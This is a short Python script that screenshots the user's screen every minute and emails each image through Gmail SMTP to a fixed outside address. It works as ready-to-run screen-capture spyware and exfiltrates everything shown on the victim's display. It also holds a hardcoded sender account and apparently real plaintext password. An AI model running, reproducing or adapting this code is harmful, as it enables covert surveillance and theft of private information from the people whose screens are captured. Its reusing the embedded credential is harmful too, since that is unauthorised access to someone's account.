import os
import smtplib
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time
import pyautogui

while True:
    pic = pyautogui.screenshot()
    pic.save('Screenshot.png')
    imgfilename = "Screenshot.png"
    img_data = open(imgfilename, 'rb').read()
    msg = MIMEMultipart()
    msg['Subject'] = 'Screenshot'
    msg['From'] = 'beria.giorgi1@gmail.com'
    msg['To'] = 'gkakhiani@gmail.com'
    text = MIMEText("test")
    msg.attach(text)
    image = MIMEImage(img_data, name=os.path.basename(imgfilename))
    msg.attach(image)
    s = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    s.ehlo()
    s.login("beria.giorgi1@gmail.com", "zmuki.1256")
    s.sendmail("beria.giorgi1@gmail.com", "gkakhiani@gmail.com", msg.as_string())
    s.quit()
    time.sleep(60)


